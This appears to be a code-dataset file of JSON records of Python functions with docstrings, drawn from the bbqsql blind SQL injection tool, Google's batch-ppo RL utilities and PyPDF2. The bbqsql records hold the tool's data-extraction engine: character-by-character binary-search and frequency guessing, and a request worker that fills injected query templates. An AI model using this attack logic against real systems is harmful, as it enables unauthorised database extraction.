{"docstring": "# if error or not started yet return ''\n", "func_signal": "def __str__(self):\n", "code": "if self.error or (not self.working and not self.done): return \"\"\n# else return char_val\nreturn self.char_val", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\ncreates a Character object for us. this generator is useful just because it keeps track of the char_index\n'''\n", "func_signal": "def _character_generator(self,row_index):\n", "code": "char_index = 1\nrow_die_event = AsyncResult()\n\nprevious_char = None\n\nwhile True:\n    c = FrequencyCharacter(\\\n        row_index     = row_index,\\\n        char_index    = char_index,\\\n        queue         = self.q,\\\n        row_die       = row_die_event,\\\n        previous_char = previous_char)\n    # note the previous char\n    previous_char = c\n    #increment our char_index\n    char_index += 1\n    #fire off the Character within our Pool.\n    self.character_pool.spawn(c.run)\n    yield c", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nlook at how many gevent \"threads\" are being used and add more rows to correct this\n'''\n", "func_signal": "def _add_rows(self):\n", "code": "row_index = 0\nwhile self.need_more_rows:\n    # add rows until we realize that we are at the end of rows\n    working_rows = len(filter(lambda row: 'working' in row,self.results))\n    for row in range(self.concurrency - working_rows):\n        self.char_gens.append(self._character_generator(row_index))\n        self.results.append([])\n        row_index += 1\n\n    gevent.sleep(.3)\n    self.need_more_rows = not(len(self.results) and filter(lambda row: len(row) and row[0] == 'error',self.results))\n\nwhile not self.shutting_down.is_set():\n    self.results_lock.acquire()\n    # delete any rows that shouldn't have been added in the first place\n    errored = filter(lambda ri: len(self.results[ri]) and self.results[ri][0] == 'error',range(len(self.results)))\n    if errored:\n        end = min(errored)\n        for ri in xrange(len(self.results)-1,end-1,-1):\n            del(self.results[ri])\n\n    self.results_lock.release()    \n    #if there aren't going to be any more rows in need of deletion we can stop this nonsense\n    if self.results and self.results[-1][0] == 'success':\n        break\n    gevent.sleep(.3)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nThis compiles the queries options and the original query string into a string.\nSee the class documentation for an example.\n'''\n", "func_signal": "def render(self):\n", "code": "section = self.q_string.split(\"${\")\noutput = section[0]\nif len(section) > 1:\n    for section in section[1:]:\n        split = section.split('}')\n        left = split[0]\n        #in case there happens to be a rogue } in our query\n        right = '}'.join(split[1:])\n        ident = left.split(':')[0]\n        val = self.options[ident]\n        if self.encoder != None:\n            val = self.encoder(val)\n        output += val\n        output += right\nreturn output", "path": "bbqsql\\lib\\query.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "# if error or not started yet return ''\n", "func_signal": "def __repr__(self):\n", "code": "if self.error or (not self.working and not self.done): return \"\"\n# else return char_val\nreturn self.char_val", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''take a dict of all the config parameters and apply it to the config object'''\n", "func_signal": "def set_config(self,config):\n", "code": "for key in config:\n    if key in self.config:\n        if(self.config[key]['types'] == [str]):\n            self.config[key]['value'] = config[key]\n        else:\n            try:\n                self.config[key]['value'] = ast.literal_eval(config[key])\n            except (ValueError, SyntaxError):\n                self.config[key]['value'] = config[key]\nself.validate()", "path": "bbqsql\\menu\\config.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nq_string syntax is \"SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}\". \nThe options are specified in ${}, with the value before the ':' being the option name\nand the value after the ':' being the default value. \n\nThere is an optional options parameter that allows you to set the option values manually rather than\nhaving them be parsed.\n'''\n", "func_signal": "def __init__(self,q_string,options=None,encoder=None):\n", "code": "self.encoder = encoder\nself.q_string = q_string\nif options:\n    self.options = options\nelse:\n    self.options = self.parse_query(q_string)", "path": "bbqsql\\lib\\query.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "#we do the next_event because the first event might be first for the last character. \n#this way we can fire the die event multiple times if necessary\n", "func_signal": "def _die_callback(self,event):\n", "code": "die_index,next_event = self.row_die.get()\nif die_index  < self.char_index and self.run_gl:\n    self.run_gl.kill(block=False)\n    self.error = True\n    self.done = True\n    self.working = False\nelse:\n    self.row_die = next_event\n    self.row_die.rawlink(self._die_callback)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "''' \nif a row is full of \"success\", but we havent reached the end yet (the last elt isnt \"error\")\nthen we need to increase the row_len.\n'''\n", "func_signal": "def _adjust_row_lengths(self):\n", "code": "while not self.shutting_down.is_set():\n    self.results_lock.acquire()\n\n    if self.row_len is not None:\n        unused_threads = self.concurrency - reduce(lambda x,row: x + row.count('working'),self.results,0)\n        rows_working = len(filter(lambda row: 'working' in row,self.results))\n        if rows_working == 0:\n            add_to_rows = self.row_len\n        else:\n            add_to_rows = unused_threads//rows_working\n            add_to_rows = [add_to_rows,1][add_to_rows==0]\n    else:\n        add_to_rows = 1\n\n    for row_index in range(len(self.results)):\n        #if the row isn't finished or hasn't been started yet, we add Character()s to the row\n        if 'error' not in self.results[row_index]:\n            self.results[row_index] += [self.char_gens[row_index].next() for i in range(add_to_rows)]\n    self.results_lock.release()\n    gevent.sleep(.3)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "#make note of the current greenlet\n", "func_signal": "def run(self):\n", "code": "self.run_gl = gevent.getcurrent()\n\nlow = 0\nhigh = settings.CHARSET_LEN\nself.working = True        \n#binary search unless we hit an error\nwhile not self.error and self.working:\n    mid = (low+high)//2\n    self.char_val = settings.CHARSET[mid]\n\n    if low >= high:\n        self.error = True\n        self.row_die.set((self.char_index,AsyncResult()))\n        break\n\n    if self._test(\"<\"):\n        #print \"data[%d][%d] > %s (%d)\" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))\n        high = mid\n    elif self._test(\">\"):\n        #print \"data[%d][%d] < %s (%d)\" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))\n        low = mid + 1\n    elif low < settings.CHARSET_LEN and self._test(\"=\"):\n        #print \"data[%d][%d] = %s (%d)\" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))\n        self.working = False\n        break\n    else:\n        #if there isn't a value for the character we are working on, that means we went past the end of the row.\n        #we set error and kill characters after us in the row.\n        self.error = True\n        self.row_die.set((self.char_index,AsyncResult()))\n        break\n\n    gevent.sleep(0)\n    \nself.done = True\nself.working = False\n\n#clear the note regarding the running greenlet\nself.run_gl = None", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''helper function for creating prompt text'''\n#base of prompt\n", "func_signal": "def setprompt(category=None, text=None):\n", "code": "prompt =  bcolors.UNDERL + bcolors.DARKCYAN + \"bbqsql\"\n#if they provide a category\nif category:\n        prompt += \":\"+category\nprompt += \">\"\n#if they provide aditional text\nif text:\n    prompt += \" \"+ text + \":\"\nprompt += bcolors.ENDC + \" \"\nreturn prompt", "path": "bbqsql\\menu\\bbq_core.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nthis runs in a gevent \"thread\". It is a worker\n'''\n#keep going until we shut down the technique\n", "func_signal": "def _request_maker(self):\n", "code": "while not self.shutting_down.is_set():\n    #pull the info needed to make a request from the queue\n    row_index,char_index,char_val,comparator,char_asyncresult = self.q.get()\n\n    #build out our query object\n    query = copy(self.query)\n    query.set_option('row_index',str(row_index))\n    query.set_option('char_index',str(char_index))\n    query.set_option('char_val',str(ord(char_val)))\n    query.set_option('comparator',comparator)\n    query_string = query.render()\n\n    self.request_count += 1\n\n    count = 0\n    response = None\n    while response == None:\n        try:\n            response = self.requester.make_request(query_string)\n        except utilities.SendRequestFailed:\n            self.failure_count += 1\n            response = None\n            gevent.sleep(.01 * 2 ** count)                    \n            if count == 10: raise SendRequestFailed('cant request')\n        count += 1\n\n    char_asyncresult.set(response)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nrun the exploit. returns the data retreived.\n    :concurrency    how many gevent \"threads\" to use. This is useful for throttling the attack.\n    :row_len        An estimated starting point for the length of rows. This will get adjusted as the attack goes on.\n'''\n", "func_signal": "def run(self,row_len=None,concurrency=20):\n", "code": "self.run_start_time = time()\n\nself.row_len = row_len\nself.concurrency = concurrency\n\n#start fresh\nself._reset()\n\nself.rungl = gevent.spawn(self._run)\n\nreturn self.rungl", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''\nLook at the results gathered so far and determine if we should keep going. we want to keep going until we have an empty row\n'''\n# chill out until we don't need any more rows\n", "func_signal": "def _keep_going(self):\n", "code": "while self.need_more_rows:\n    gevent.sleep(1)\n\n# chill out untill all the rows have finished working\nwhile filter(lambda row:'error' not in row or 'working' in row[:row.index('error')],self.results):\n    gevent.sleep(.5)\n\n# call it quits\nself.shutting_down.set()", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "''' \nif a row is full of \"success\", but we havent reached the end yet (the last elt isnt \"error\")\nthen we need to increase the row_len.\n'''\n", "func_signal": "def _adjust_row_lengths(self):\n", "code": "while not self.shutting_down.is_set():\n    self.results_lock.acquire()\n\n    for row_index in range(len(self.results)):\n        #if the row isn't finished or hasn't been started yet, we add Character()s to the row\n        if not len(self.results[row_index]) or ('error' not in self.results[row_index] and self.results[row_index][-1] == \"success\"):\n            self.results[row_index].append(self.char_gens[row_index].next())\n\n    self.results_lock.release()\n    gevent.sleep(.3)", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "#make note of the current greenlet\n", "func_signal": "def run(self):\n", "code": "self.run_gl = gevent.getcurrent()\n\nself.working = True        \n\ntried = []\nchars_to_try = copy(characters_by_freq)\nprevious_char_finished = False\n\nsuccess = False\n\nwhile not success and len(chars_to_try):\n    if not previous_char_finished and self.previous_char and self.previous_char == \"success\":\n        chars_to_try = filter(lambda c: c not in tried,diagraphs[self.previous_char.char_val])\n        previous_char_finished = True\n\n    self.char_val = chars_to_try.pop(0)\n\n    if self._test(\"=\"):\n        success = True\n\n    tried.append(self.char_val)\n\n    gevent.sleep(0)\n\nif not success:\n    self.error = True\n    self.row_die.set((self.char_index,AsyncResult()))\n    \nself.done = True\nself.working = False\n\n#clear the note regarding the running greenlet\nself.run_gl = None", "path": "bbqsql\\lib\\technique.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "'''Return a dict of all the set config parameters'''\n# make sure we're on the up and up\n", "func_signal": "def get_config(self):\n", "code": "kwargs = {}\nfor key in self.config:\n    if self.config[key]['value'] != None:\n        kwargs[key] = self.config[key]['value']\nreturn kwargs", "path": "bbqsql\\menu\\config.py", "repo_name": "CiscoCXSecurity/bbqsql", "stars": 659, "license": "other", "language": "python", "size": 466}
{"docstring": "\"\"\"Step environment in a separate process for lock free parallelism.\n\nThe environment will be created in the external process by calling the\nspecified callable. This can be an environment class, or a function\ncreating the environment and potentially wrapping it. The returned\nenvironment should not access global variables.\n\nArgs:\n  constructor: Callable that creates and returns an OpenAI gym environment.\n\nAttributes:\n  observation_space: The cached observation space of the environment.\n  action_space: The cached action space of the environment.\n\"\"\"\n", "func_signal": "def __init__(self, constructor):\n", "code": "self._conn, conn = multiprocessing.Pipe()\nself._process = multiprocessing.Process(\n    target=self._worker, args=(constructor, conn))\natexit.register(self.close)\nself._process.start()\nself._observ_space = None\nself._action_space = None", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Create a saver for the variables we want to checkpoint.\n\nArgs:\n  exclude: List of regexes to match variable names to exclude.\n\nReturns:\n  Saver object.\n\"\"\"\n", "func_signal": "def define_saver(exclude=None):\n", "code": "variables = []\nexclude = exclude or []\nexclude = [re.compile(regex) for regex in exclude]\nfor variable in tf.global_variables():\n  if any(regex.match(variable.name) for regex in exclude):\n    continue\n  variables.append(variable)\nsaver = tf.train.Saver(variables, keep_checkpoint_every_n_hours=5)\nreturn saver", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Step the environment.\n\nArgs:\n  action: The action to apply to the environment.\n  blocking: Whether to wait for the result.\n\nReturns:\n  Transition tuple when blocking, otherwise callable that returns the\n  transition tuple.\n\"\"\"\n", "func_signal": "def step(self, action, blocking=True):\n", "code": "promise = self.call('step', action)\nif blocking:\n  return promise()\nelse:\n  return promise", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Convert the reward to 32 bits.\n\nArgs:\n  reward: Numpy reward.\n\nRaises:\n  ValueError: Rewards contain infinite values.\n\nReturns:\n  Numpy reward with 32-bit data type.\n\"\"\"\n", "func_signal": "def _convert_reward(self, reward):\n", "code": "if not np.isfinite(reward).all():\n  raise ValueError('Infinite reward encountered.')\nreturn np.array(reward, dtype=np.float32)", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Request an attribute from the environment.\n\nNote that this involves communication with the external process, so it can\nbe slow.\n\nArgs:\n  name: Attribute to access.\n\nReturns:\n  Value of the attribute.\n\"\"\"\n", "func_signal": "def __getattr__(self, name):\n", "code": "self._conn.send((self._ACCESS, name))\nreturn self._receive()", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Asynchronously call a method of the external environment.\n\nArgs:\n  name: Name of the method to call.\n  *args: Positional arguments to forward to the method.\n  **kwargs: Keyword arguments to forward to the method.\n\nReturns:\n  Promise object that blocks and provides the return value when called.\n\"\"\"\n", "func_signal": "def call(self, name, *args, **kwargs):\n", "code": "payload = name, args, kwargs\nself._conn.send((self._CALL, payload))\nreturn self._receive", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Augment the observation with past observations.\n\nImplemented as a Numpy ring buffer holding the necessary past observations.\n\nArgs:\n  env: OpenAI Gym environment to wrap.\n  past_indices: List of non-negative integers indicating the time offsets\n    from the current time step of observations to include.\n  flatten: Concatenate the past observations rather than stacking them.\n\nRaises:\n  KeyError: The current observation is not included in the indices.\n\"\"\"\n", "func_signal": "def __init__(self, env, past_indices, flatten):\n", "code": "if 0 not in past_indices:\n  raise KeyError('Past indices should include 0 for the current frame.')\nself._env = env\nself._past_indices = past_indices\nself._step = 0\nself._buffer = None\nself._capacity = max(past_indices) + 1\nself._flatten = flatten", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Define the algorithm and environment interaction.\n\nArgs:\n  batch_env: In-graph environments object.\n  algo_cls: Constructor of a batch algorithm.\n  config: Configuration object for the algorithm.\n\nReturns:\n  Object providing graph elements via attributes.\n\"\"\"\n# pylint: disable=unused-variable\n", "func_signal": "def define_simulation_graph(batch_env, algo_cls, config):\n", "code": "step = tf.Variable(0, False, dtype=tf.int32, name='global_step')\nis_training = tf.placeholder(tf.bool, name='is_training')\nshould_log = tf.placeholder(tf.bool, name='should_log')\ndo_report = tf.placeholder(tf.bool, name='do_report')\nforce_reset = tf.placeholder(tf.bool, name='force_reset')\nalgo = algo_cls(batch_env, step, is_training, should_log, config)\ndone, score, summary = tools.simulate(\n    batch_env, algo, should_log, force_reset)\nmessage = 'Graph contains {} trainable variables.'\ntf.logging.info(message.format(tools.count_weights()))\n# pylint: enable=unused-variable\nreturn tools.AttrDict(locals())", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Cache observation and action space to not recompute them repeatedly.\n\nArgs:\n  env: OpenAI Gym environment.\n\"\"\"\n", "func_signal": "def __init__(self, env):\n", "code": "self._env = env\nself._observation_space = self._env.observation_space\nself._action_space = self._env.action_space", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Reset the environment and convert the resulting observation.\n\nReturns:\n  Converted observation.\n\"\"\"\n", "func_signal": "def reset(self):\n", "code": "observ = self._env.reset()\nobserv = self._convert_observ(observ)\nreturn observ", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Forward action to the wrapped environment.\n\nArgs:\n  action: Action to apply to the environment.\n\nRaises:\n  ValueError: Invalid action.\n\nReturns:\n  Converted observation, converted reward, done flag, and info object.\n\"\"\"\n", "func_signal": "def step(self, action):\n", "code": "observ, reward, done, info = self._env.step(action)\nobserv = self._convert_observ(observ)\nreward = self._convert_reward(reward)\nreturn observ, reward, done, info", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Configure the TensorFlow logger.\"\"\"\n", "func_signal": "def set_up_logging():\n", "code": "tf.logging.set_verbosity(tf.logging.INFO)\nlogging.getLogger('tensorflow').propagate = False", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Initialize or restore variables from a checkpoint if available.\n\nArgs:\n  sess: Session to initialize variables in.\n  saver: Saver to restore variables.\n  logdir: Directory to search for checkpoints.\n  checkpoint: Specify what checkpoint name to use; defaults to most recent.\n  resume: Whether to expect recovering a checkpoint or starting a new run.\n\nRaises:\n  ValueError: If resume expected but no log directory specified.\n  RuntimeError: If no resume expected but a checkpoint was found.\n\"\"\"\n", "func_signal": "def initialize_variables(sess, saver, logdir, checkpoint=None, resume=None):\n", "code": "sess.run(tf.group(\n    tf.local_variables_initializer(),\n    tf.global_variables_initializer()))\nif resume and not (logdir or checkpoint):\n  raise ValueError('Need to specify logdir to resume a checkpoint.')\nif logdir:\n  state = tf.train.get_checkpoint_state(logdir)\n  if checkpoint:\n    checkpoint = os.path.join(logdir, checkpoint)\n  if not checkpoint and state and state.model_checkpoint_path:\n    checkpoint = state.model_checkpoint_path\n  if checkpoint and resume is False:\n    message = 'Found unexpected checkpoint when starting a new run.'\n    raise RuntimeError(message)\n  if checkpoint:\n    saver.restore(sess, checkpoint)", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Convert the observation to 32 bits.\n\nArgs:\n  observ: Numpy observation.\n\nRaises:\n  ValueError: Observation contains infinite values.\n\nReturns:\n  Numpy observation with 32-bit data type.\n\"\"\"\n", "func_signal": "def _convert_observ(self, observ):\n", "code": "if not np.isfinite(observ).all():\n  raise ValueError('Infinite observation encountered.')\nif observ.dtype == np.float64:\n  return observ.astype(np.float32)\nif observ.dtype == np.int64:\n  return observ.astype(np.int32)\nreturn observ", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Create environments and apply all desired wrappers.\n\nArgs:\n  constructor: Constructor of an OpenAI gym environment.\n  num_agents: Number of environments to combine in the batch.\n  env_processes: Whether to step environment in external processes.\n\nReturns:\n  In-graph environments object.\n\"\"\"\n", "func_signal": "def define_batch_env(constructor, num_agents, env_processes):\n", "code": "with tf.variable_scope('environments'):\n  if env_processes:\n    envs = [\n        tools.wrappers.ExternalProcess(constructor)\n        for _ in range(num_agents)]\n  else:\n    envs = [constructor() for _ in range(num_agents)]\n  batch_env = tools.BatchEnv(envs, blocking=not env_processes)\n  batch_env = tools.InGraphBatchEnv(batch_env)\nreturn batch_env", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Send a close message to the external process and join it.\"\"\"\n", "func_signal": "def close(self):\n", "code": "try:\n  self._conn.send((self._CLOSE, None))\n  self._conn.close()\nexcept IOError:\n  # The connection was already closed.\n  pass\nself._process.join()", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Wait for a message from the worker process and return its payload.\n\nRaises:\n  Exception: An exception was raised inside the worker process.\n  KeyError: The received message is of an unknown type.\n\nReturns:\n  Payload object of the message.\n\"\"\"\n", "func_signal": "def _receive(self):\n", "code": "message, payload = self._conn.recv()\n# Re-raise exceptions in the main process.\nif message == self._EXCEPTION:\n  stacktrace = payload\n  raise Exception(stacktrace)\nif message == self._RESULT:\n  return payload\nraise KeyError('Received message of unexpected type {}'.format(message))", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Reset the environment.\n\nArgs:\n  blocking: Whether to wait for the result.\n\nReturns:\n  New observation when blocking, otherwise callable that returns the new\n  observation.\n\"\"\"\n", "func_signal": "def reset(self, blocking=True):\n", "code": "promise = self.call('reset')\nif blocking:\n  return promise()\nelse:\n  return promise", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"The process waits for actions and sends back environment results.\n\nArgs:\n  constructor: Constructor for the OpenAI Gym environment.\n  conn: Connection for communication to the main process.\n\nRaises:\n  KeyError: When receiving a message of unknown type.\n\"\"\"\n", "func_signal": "def _worker(self, constructor, conn):\n", "code": "try:\n  env = constructor()\n  while True:\n    try:\n      # Only block for short times to have keyboard exceptions be raised.\n      if not conn.poll(0.1):\n        continue\n      message, payload = conn.recv()\n    except (EOFError, KeyboardInterrupt):\n      break\n    if message == self._ACCESS:\n      name = payload\n      result = getattr(env, name)\n      conn.send((self._RESULT, result))\n      continue\n    if message == self._CALL:\n      name, args, kwargs = payload\n      result = getattr(env, name)(*args, **kwargs)\n      conn.send((self._RESULT, result))\n      continue\n    if message == self._CLOSE:\n      assert payload is None\n      break\n    raise KeyError('Received message of unknown type {}'.format(message))\nexcept Exception:  # pylint: disable=broad-except\n  stacktrace = ''.join(traceback.format_exception(*sys.exc_info()))\n  tf.logging.error('Error in environment process: {}'.format(stacktrace))\n  conn.send((self._EXCEPTION, stacktrace))\nconn.close()", "path": "agents\\tools\\wrappers.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"Save a new configuration by name.\n\nIf a logging directory is specified, is will be created and the configuration\nwill be stored there. Otherwise, a log message will be printed.\n\nArgs:\n  config: Configuration object.\n  logdir: Location for writing summaries and checkpoints if specified.\n\nReturns:\n  Configuration object.\n\"\"\"\n", "func_signal": "def save_config(config, logdir=None):\n", "code": "if logdir:\n  with config.unlocked:\n    config.logdir = logdir\n  message = 'Start a new run and write summaries and checkpoints to {}.'\n  tf.logging.info(message.format(config.logdir))\n  tf.gfile.MakeDirs(config.logdir)\n  config_path = os.path.join(config.logdir, 'config.yaml')\n  with tf.gfile.FastGFile(config_path, 'w') as file_:\n    yaml.dump(config, file_, default_flow_style=False)\nelse:\n  message = (\n      'Start a new run without storing summaries and checkpoints since no '\n      'logging directory was specified.')\n  tf.logging.info(message)\nreturn config", "path": "agents\\scripts\\utility.py", "repo_name": "google-research/batch-ppo", "stars": 962, "license": "apache-2.0", "language": "python", "size": 151}
{"docstring": "\"\"\"\nRetrieves the named destinations present in the document.\n\n:return: a dictionary which maps names to\n    :class:`Destinations<PyPDF2.generic.Destination>`.\n:rtype: dict\n\"\"\"\n", "func_signal": "def getNamedDestinations(self, tree=None, retval=None):\n", "code": "if retval == None:\n    retval = {}\n    catalog = self.trailer[\"/Root\"]\n\n    # get the name tree\n    if \"/Dests\" in catalog:\n        tree = catalog[\"/Dests\"]\n    elif \"/Names\" in catalog:\n        names = catalog['/Names']\n        if \"/Dests\" in names:\n            tree = names['/Dests']\n\nif tree == None:\n    return retval\n\nif \"/Kids\" in tree:\n    # recurse down the tree\n    for kid in tree[\"/Kids\"]:\n        self.getNamedDestinations(kid.getObject(), retval)\n\nif \"/Names\" in tree:\n    names = tree[\"/Names\"]\n    for i in range(0, len(names), 2):\n        key = names[i].getObject()\n        val = names[i+1].getObject()\n        if isinstance(val, DictionaryObject) and '/D' in val:\n            val = val['/D']\n        dest = self._buildDestination(key, val)\n        if dest != None:\n            retval[key] = dest\n\nreturn retval", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nThis is similar to mergePage, but the stream to be merged is rotated\nby appling a transformation matrix.\n\n:param PageObject page2: the page to be merged into this one. Should be\n    an instance of :class:`PageObject<PageObject>`.\n:param float rotation: The angle of the rotation, in degrees\n:param bool expand: Whether the page should be expanded to fit the\n    dimensions of the page to be merged.\n\"\"\"\n", "func_signal": "def mergeRotatedPage(self, page2, rotation, expand=False):\n", "code": "rotation = math.radians(rotation)\nreturn self.mergeTransformedPage(page2,\n    [math.cos(rotation),  math.sin(rotation),\n     -math.sin(rotation), math.cos(rotation),\n     0,                   0], expand)", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\n:return: the number of pages.\n:rtype: int\n\"\"\"\n", "func_signal": "def getNumPages(self):\n", "code": "pages = self.getObject(self._pages)\nreturn int(pages[NameObject(\"/Count\")])", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nRetrieve page number of a given Destination object\n\n:param Destination destination: The destination to get page number.\n     Should be an instance of\n     :class:`Destination<PyPDF2.pdf.Destination>`\n:return: the page number or -1 if page not found\n:rtype: int\n\"\"\"\n", "func_signal": "def getDestinationPageNumber(self, destination):\n", "code": "indirectRef = destination.page\nret = self._getPageNumberByIndirect(indirectRef)\nreturn ret", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
{"docstring": "\"\"\"\nEncrypt this PDF file with the PDF Standard encryption handler.\n\n:param str user_pwd: The \"user password\", which allows for opening\n    and reading the PDF file with the restrictions provided.\n:param str owner_pwd: The \"owner password\", which allows for\n    opening the PDF files without any restrictions.  By default,\n    the owner password is the same as the user password.\n:param bool use_128bit: flag as to whether to use 128bit\n    encryption.  When false, 40bit encryption will be used.  By default,\n    this flag is on.\n\"\"\"\n", "func_signal": "def encrypt(self, user_pwd, owner_pwd = None, use_128bit = True):\n", "code": "import time, random\nif owner_pwd == None:\n    owner_pwd = user_pwd\nif use_128bit:\n    V = 2\n    rev = 3\n    keylen = int(128 / 8)\nelse:\n    V = 1\n    rev = 2\n    keylen = int(40 / 8)\n# permit everything:\nP = -1\nO = ByteStringObject(_alg33(owner_pwd, user_pwd, rev, keylen))\nID_1 = ByteStringObject(md5(b_(repr(time.time()))).digest())\nID_2 = ByteStringObject(md5(b_(repr(random.random()))).digest())\nself._ID = ArrayObject((ID_1, ID_2))\nif rev == 2:\n    U, key = _alg34(user_pwd, O, P, ID_1)\nelse:\n    assert rev == 3\n    U, key = _alg35(user_pwd, rev, keylen, O, P, ID_1, False)\nencrypt = DictionaryObject()\nencrypt[NameObject(\"/Filter\")] = NameObject(\"/Standard\")\nencrypt[NameObject(\"/V\")] = NumberObject(V)\nif V == 2:\n    encrypt[NameObject(\"/Length\")] = NumberObject(keylen * 8)\nencrypt[NameObject(\"/R\")] = NumberObject(rev)\nencrypt[NameObject(\"/O\")] = ByteStringObject(O)\nencrypt[NameObject(\"/U\")] = ByteStringObject(U)\nencrypt[NameObject(\"/P\")] = NumberObject(P)\nself._encrypt = self._addObject(encrypt)\nself._encrypt_key = key", "path": "PyPDF2\\pdf.py", "repo_name": "gagayuan/runoob-PDF-", "stars": 567, "license": "None", "language": "python", "size": 1561309}
